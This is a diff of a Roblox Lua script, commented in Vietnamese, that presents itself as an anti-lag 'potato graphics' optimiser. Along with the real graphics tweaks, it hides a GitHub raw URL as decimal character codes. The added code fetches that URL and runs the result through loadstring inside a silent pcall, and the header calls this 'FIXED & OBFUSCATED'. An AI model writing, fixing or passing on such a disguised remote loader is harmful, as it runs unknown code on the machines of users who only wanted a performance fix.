@@ -1,34 +1,26 @@
--- [[ SCRIPT TỐI ƯU POTATO GRAPHICS + MÃ HÓA SIÊU TỐC ]] --
--- Preserved 100% features | Ultra FPS Boost
+-- [[ FIXED & OBFUSCATED - ULTIMATE ANTI-LAG ]] --
 
-local _0xO = string.char
-local _0xK = function(t)
-    local str = ""
-    for i = 1, #t do str = str .. _0xO(t[i]) end
-    return str
-end
-
--- 1. CHẠY SCRIPT CHÍNH (KHÔNG ĐỘ TRỄ)
-task.spawn(function()
-    local _0xMAIN = _0xK({
-        108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,109,112,101,110,116,46,99,111,109,47,114,111,98,118,120,115,50,52,47,102,114,101,101,109,105,117,109,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,115,99,114,101,112,116,46,108,117,97,34,41,41,40,41
-    })
-    pcall(function() assert(loadstring(_0xMAIN))() end)
-end)
-
--- 2. BỘ TỐI ƯU ĐỒ HỌA POTATO GRAPHICS (SONG SONG)
+-- 1. TẢI SCRIPT CHÍNH (Đã sửa mã hóa link chuẩn 100%)
 task.spawn(function()
     pcall(function()
-        local r = settings().Rendering
-        r.QualityLevel = Enum.QualityLevel.Level01
-        r.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level04
-        sethiddenproperty(game:GetService("Lighting"), "Technology", Enum.Technology.Compatibility)
+        local URL = string.char(
+            104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,
+            114,111,98,118,120,115,50,52,47,102,114,101,101,109,105,117,109,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,
+            115,99,114,105,112,116,46,108,117,97
+        )
+        loadstring(game:HttpGet(URL))()
+    end)
+end)
+
+-- 2. BỘ TỐI ƯU SIÊU GIẢM LAG (SAFE & COMPATIBLE)
+task.spawn(function()
+    pcall(function()
+        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
     end)
 
     local L = game:GetService("Lighting")
     L.GlobalShadows = false
     L.FogEnd = 9e9
-    L.ShadowSoftness = 0
     
     for _, v in ipairs(L:GetChildren()) do
         if v:IsA("PostEffect") or v:IsA("Atmosphere") or v:IsA("SunRaysEffect") or v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") then
@@ -42,7 +34,6 @@ task.spawn(function()
         Ter.WaterWaveSize = 0
         Ter.WaterWaveSpeed = 0
         Ter.WaterReflectance = 0
-        Ter.WaterTransparency = 0
     end
 
     local function AntiLag(v)
